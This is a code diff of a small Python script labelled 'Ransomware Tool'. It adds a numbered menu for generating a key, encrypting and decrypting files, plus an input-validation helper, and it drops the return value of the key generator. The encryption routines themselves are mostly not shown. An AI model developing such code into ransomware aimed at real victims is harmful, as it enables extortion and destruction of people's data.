@@ -16,7 +16,6 @@ def gen_key():
     # string the key in a file
     with open('file_key.key', 'wb') as file_key:
         file_key.write(key)
-    return key
 
 
 def encrypt():
@@ -63,3 +62,41 @@ def decrypt():
     # writing the decrypted data
     with open(file, "wb") as dec_file:
         dec_file.write(decrypted)
+
+
+def int_input_getter(prompt, num_range):
+    while True:
+        # Test for errors.
+        try:
+            choice = int(input(prompt))
+        # If there is a value error pass so the loop can restart.
+        except ValueError:
+            pass
+        # Otherwise, test to see if the number chosen is available.
+        else:
+            # If the number is available then return that number.
+            if choice in num_range:
+                return choice
+            else:
+                print("That is not an option!")
+                input("Press enter to continue...")
+
+
+main_menu = """Ransomware Tool
+1. Gen-key
+2. Encrypt
+3. Decrypt
+4. Quit
+"""
+
+while True:
+    uio = int_input_getter(main_menu, range(1, 5))
+    if uio == 1:
+        gen_key()
+    elif uio == 2:
+        encrypt()
+    elif uio == 3:
+        decrypt()
+    else:
+        exit(0)
+
